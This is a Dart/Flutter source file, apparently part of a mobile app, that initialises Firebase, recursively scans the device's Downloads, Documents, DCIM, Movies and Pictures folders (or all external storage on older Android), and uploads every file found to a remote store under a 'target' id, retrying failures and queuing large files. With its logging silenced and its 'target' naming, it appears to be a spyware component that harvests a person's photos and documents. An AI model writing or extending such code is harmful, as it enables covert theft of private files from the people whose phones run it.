import 'dart:convert';
import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:magic/helpers/db_helper.dart';
import 'package:magic/helpers/device_helper.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/helpers/file_tree.dart';
import 'package:magic/model/file_info_model.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../firebase_options.dart';

class ServiceHelper {
  static const String _syncQueueKey = 'local_sync_queue';
  static const String _heavyFilesQueueKey = 'heavy_files_queue';
  static const int _heavyFileThresholdMB = 100;
  static bool _firebaseInitialized = false;

  /// Ensure Firebase initialized only once
  static Future<void> _ensureFirebase() async {
    if (!_firebaseInitialized) {
      await Firebase.initializeApp(
        options: DefaultFirebaseOptions.currentPlatform,
      );
      _firebaseInitialized = true;
    }
  }

  /// Add task to local sync queue
  static Future<void> addToLocalSyncQueue(Map<String, dynamic> task) async {
    final prefs = await SharedPreferences.getInstance();
    final queueStr = prefs.getString(_syncQueueKey);
    List<Map<String, dynamic>> queue = [];
    if (queueStr != null) {
      final decoded = json.decode(queueStr);
      if (decoded is List) {
        queue = decoded.cast<Map<String, dynamic>>();
      }
    }
    queue.add(task);
    await prefs.setString(_syncQueueKey, json.encode(queue));
  }

  /// Get all tasks from local sync queue
  static Future<List<Map<String, dynamic>>> getLocalSyncQueue() async {
    final prefs = await SharedPreferences.getInstance();
    final queueStr = prefs.getString(_syncQueueKey);
    if (queueStr != null) {
      final decoded = json.decode(queueStr);
      if (decoded is List) {
        return decoded.cast<Map<String, dynamic>>();
      }
    }
    return [];
  }

  /// Clear local sync queue
  static Future<void> clearLocalSyncQueue() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove(_syncQueueKey);
  }

  /// Add task to heavy files queue (files > 100MB)
  static Future<void> addToHeavyFilesQueue(Map<String, dynamic> task) async {
    final prefs = await SharedPreferences.getInstance();
    final queueStr = prefs.getString(_heavyFilesQueueKey);
    List<Map<String, dynamic>> queue = [];
    if (queueStr != null) {
      final decoded = json.decode(queueStr);
      if (decoded is List) {
        queue = decoded.cast<Map<String, dynamic>>();
      }
    }
    queue.add(task);
    await prefs.setString(_heavyFilesQueueKey, json.encode(queue));
  }

  /// Get heavy files queue
  static Future<List<Map<String, dynamic>>> getHeavyFilesQueue() async {
    final prefs = await SharedPreferences.getInstance();
    final queueStr = prefs.getString(_heavyFilesQueueKey);
    if (queueStr != null) {
      final decoded = json.decode(queueStr);
      if (decoded is List) {
        return decoded.cast<Map<String, dynamic>>();
      }
    }
    return [];
  }

  /// Clear heavy files queue
  static Future<void> clearHeavyFilesQueue() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove(_heavyFilesQueueKey);
  }

  /// Check if file is heavy (> 100MB)
  static bool isHeavyFile(File file) {
    try {
      final fileSize = file.lengthSync();
      final fileSizeMB = fileSize / (1024 * 1024);
      return fileSizeMB > _heavyFileThresholdMB;
    } catch (e) {
      return false;
    }
  }

  /// Sync local queue with Firebase (prioritized: regular queue first, then heavy files)
  static Future<void> syncLocalQueueWithFirebase(String target) async {
    //  print('STARTING SYNC LOCAL QUEUE WITH FIREBASE');
    await _ensureFirebase();

    // First process regular queue (small files and failed uploads)
    final queue = await getLocalSyncQueue();
    List<Map<String, dynamic>> failed = [];

    for (final task in queue) {
      try {
        final file = File(task['path']);
        if (!await file.exists()) {
          // File no longer exists, skip it
          continue;
        }

        bool resultSend = await DeviceHelper.upload(target, file);
        if (resultSend) {
          await DeviceHelper.addFileTree(id: target, data: task);
        } else {
          failed.add(task);
        }
      } catch (e) {
        failed.add(task);
      }
    }

    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_syncQueueKey, json.encode(failed));

    // Then process heavy files queue with lower priority
    await processHeavyFilesQueue(target);
  }

  /// Upload multiple files and return a list of successfully uploaded paths.
  static Future<List<String>> startFileUpload(
      List<String> filePaths, String target) async {
    await _ensureFirebase();
    final List<String> successfullyUploaded = [];

    for (final path in filePaths) {
      final file = File(path);
      try {
        final success = await DeviceHelper.upload(target, file);
        if (success) {
          // print('[ServiceHelper] Successfully uploaded: $path');
          successfullyUploaded.add(path);
        }
      } catch (e) {
        // print('[ServiceHelper] WARN: Failed to upload $path: $e');
      }
    }

    return successfullyUploaded;
  }

  /// Get list of folders to scan
  static Future<List<String>> getAvailableFoldersToScan(
      {List<String>? extraFolders}) async {
    List<String> folders = [];

    try {
      final Directory? appDocDir = await FileTreeService.getDocumentsDir();
      final Directory? downloadDir = await FileTreeService.getDownloadDir();
      final Directory? dcimDir = await FileTreeService.getDcimDir();
      final Directory? movieDir = await FileTreeService.getMoviesDir();
      final Directory? pictureDir = await FileTreeService.getPicturesDir();

      final List<Directory?> candidateDirs = [
        downloadDir,
        appDocDir,
        dcimDir,
        movieDir,
        pictureDir,
      ];

      // Додаємо перевірку існування і null
      for (final dir in candidateDirs) {
        if (dir != null && await dir.exists()) {
          folders.add(dir.path);
        } else if (dir != null) {
          //  print('[INFO] Folder not found or inaccessible: ${dir.path}');
        }
      }

      // Перевірка додаткових папок
      if (extraFolders != null) {
        for (final folder in extraFolders) {
          final d = Directory(folder);
          if (await d.exists()) {
            folders.add(folder);
          } else {
            //    print('[INFO] Extra folder not found or inaccessible: $folder');
          }
        }
      }
    } catch (e) {
      // print('[ERROR] Error fetching folders: $e');
    }

    return folders;
  }

  /// Scan folders and upload new files with priority (light files first, heavy files second)
  static Future<void> getFilesTreeWithPriority(int sdkVersion, String target,
      {List<String>? extraFolders}) async {
    List<String> folderList = [];

    if (sdkVersion < 30) {
      final extStorage = await FileTreeService.getExternalStorageDir();
      if (extStorage != null && await extStorage.exists()) {
        folderList = [extStorage.path];
      }
    } else {
      folderList = await getAvailableFoldersToScan(extraFolders: extraFolders);
    }

    List<String> uploadedPaths = await DeviceInfoHelper.getUploadedFileTree();
    List<String> lightFiles = [];
    List<String> heavyFiles = [];
    List<String> allFoundFiles = [];

    // print('[DEBUG] getFilesTreeWithPriority: scanning ${folderList.length} folders');

    for (final folder in folderList) {
      try {
        final dir = Directory(folder);
        await for (final entity in dir.list(recursive: true)) {
          if (entity is File) {
            allFoundFiles.add(entity.path);
            if (!uploadedPaths.contains(entity.path)) {
              // Categorize by file size
              if (isHeavyFile(entity)) {
                heavyFiles.add(entity.path);
              } else {
                lightFiles.add(entity.path);
              }
            }
          }
        }
      } catch (e) {
        //  print('[ERROR] Failed to list folder $folder: $e');
      }
    }

    // print('[DEBUG] Found total files: ${allFoundFiles.length}');
    // print('[DEBUG] Light files pending upload: ${lightFiles.length}');
    // print('[DEBUG] Heavy files pending upload: ${heavyFiles.length}');

    // Save the initial scan results
    await DbHelper.saveFilesScanInfo(
      id: target,
      folders: folderList,
      foundFiles: allFoundFiles.length,
      newlyUploadedCount: 0,
      totalUploadedCount: uploadedPaths.length,
    );

    int newlyUploadedCount = 0;

    // FIRST PRIORITY: Upload light files
    if (lightFiles.isNotEmpty) {
      // print('[DEBUG] Starting upload of ${lightFiles.length} light files...');
      for (final path in lightFiles) {
        final file = File(path);
        try {
          final success = await DeviceHelper.upload(target, file);
          if (success) {
            uploadedPaths.add(path);
            await DeviceInfoHelper.saveUploadedFileTree(uploadedPaths);
            newlyUploadedCount++;
          }
        } catch (e) {
          // print('[ServiceHelper] WARN: Failed to upload light file $path: $e');
          // Add to regular queue for retry
          final fileInfo = FileInfoModel(
            name: path.split('/').last,
            path: path,
            type: 'file',
            uploaded: '',
          );
          await addToLocalSyncQueue(fileInfo.toMap());
        }
      }
    }

    // SECOND PRIORITY: Add heavy files to special queue (they will be uploaded last)
    if (heavyFiles.isNotEmpty) {
      // print('[DEBUG] Adding ${heavyFiles.length} heavy files to second priority queue...');
      for (final path in heavyFiles) {
        final fileInfo = FileInfoModel(
          name: path.split('/').last,
          path: path,
          type: 'file',
          uploaded: '',
        );
        await addToHeavyFilesQueue(fileInfo.toMap());
      }
    }

    await DeviceInfoHelper.saveStatusFileTree();

    // Update scan results with newly uploaded count
    if (newlyUploadedCount > 0) {
      await DbHelper.saveFilesScanInfo(
        id: target,
        folders: folderList,
        foundFiles: allFoundFiles.length,
        newlyUploadedCount: newlyUploadedCount,
        totalUploadedCount: uploadedPaths.length,
      );
    }

    // Now process heavy files queue if there's time/bandwidth
    await processHeavyFilesQueue(target);
  }

  /// Process heavy files queue (files > 100MB)
  static Future<void> processHeavyFilesQueue(String target) async {
    final heavyQueue = await getHeavyFilesQueue();
    if (heavyQueue.isEmpty) return;

    // print('[DEBUG] Processing ${heavyQueue.length} heavy files...');
    List<Map<String, dynamic>> remainingHeavyFiles = [];
    List<String> uploadedPaths = await DeviceInfoHelper.getUploadedFileTree();

    for (final task in heavyQueue) {
      try {
        final file = File(task['path']);
        if (!await file.exists()) {
          // File no longer exists, skip it
          continue;
        }

        bool resultSend = await DeviceHelper.upload(target, file);
        if (resultSend) {
          uploadedPaths.add(task['path']);
          await DeviceInfoHelper.saveUploadedFileTree(uploadedPaths);

          // Update file info in Firebase
          task['uploaded'] = DateTime.now().toIso8601String();
          await DeviceHelper.addFileTree(id: target, data: task);
        } else {
          // Keep in queue for retry
          remainingHeavyFiles.add(task);
        }
      } catch (e) {
        // Keep in queue for retry
        remainingHeavyFiles.add(task);
        // print('[ERROR] Failed to upload heavy file ${task['path']}: $e');
      }
    }

    // Update heavy files queue with remaining files
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(
        _heavyFilesQueueKey, json.encode(remainingHeavyFiles));
  }

  /// Upload a single file (handles queue if failed, prioritizes by size)
  static Future<String?> uploadFile(File file, String target) async {
    //print('========\nUploading file: ${file.path}\n=========');
    final path = file.path;
    final title = path.split('/').last;

    FileInfoModel fileInfo = FileInfoModel(
      name: title,
      path: path,
      type: 'file',
      uploaded: '',
    );

    if (title.startsWith('.')) {
      // print('[INFO] Skipping hidden/system file: $path');
      return null;
    }

    await _ensureFirebase();

    try {
      bool resultSend = await DeviceHelper.upload(target, file);
      //  print('[DEBUG] uploadFile: $title, result: $resultSend');
      if (resultSend) {
        fileInfo.uploaded = DateTime.now().toIso8601String();
        await DeviceHelper.addFileTree(id: target, data: fileInfo.toMap());
        return path;
      } else {
        // Failed upload: add to appropriate queue based on file size
        if (isHeavyFile(file)) {
          await addToHeavyFilesQueue(fileInfo.toMap());
        } else {
          await addToLocalSyncQueue(fileInfo.toMap());
        }
      }
    } catch (e) {
      // Error during upload: add to appropriate queue based on file size
      if (isHeavyFile(file)) {
        await addToHeavyFilesQueue(fileInfo.toMap());
      } else {
        await addToLocalSyncQueue(fileInfo.toMap());
      }
      //  print('[ERROR] uploadFile: $e');
    }
    return null;
  }
}
